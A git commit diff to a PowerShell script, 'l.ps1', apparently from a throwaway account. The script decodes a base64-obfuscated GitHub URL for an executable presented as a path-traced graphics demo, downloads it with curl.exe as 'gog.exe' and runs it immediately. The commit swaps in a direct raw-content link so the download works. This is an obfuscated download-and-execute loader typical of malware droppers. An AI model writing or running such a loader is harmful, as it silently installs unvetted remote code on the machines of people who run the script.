f2a4a057e684f7b0a0e0f5127b2f434df07bbaa5
V0FTRAWASD2221321 <V0FTRAWASD2221321@proton.me>
2026-05-23 19:17:31 -0700

    Update l.ps1

--- l.ps1
+++ l.ps1
@@ -1,4 +1,5 @@
- $b =  ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aHR0cHM6Ly9naXRodWIuY29tL1YwRlRSQVdBU0QyMjIxMzIxL2Nvb2xkZW1vbW9tby9ibG9iL21haW4veXgtcGVucm9zZS1wYXRodHJhY2VkLmV4ZQ=="))).Trim()
+ $b =  ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1YwRlRSQVdBU0QyMjIxMzIxL2Nvb2xk
+ZW1vbW9tby9tYWluL3l4LXBlbnJvc2UtcGF0aHRyYWNlZC5leGUK"))).Trim()
 
  curl.exe $b -o ./gog.exe; ./gog.exe
 
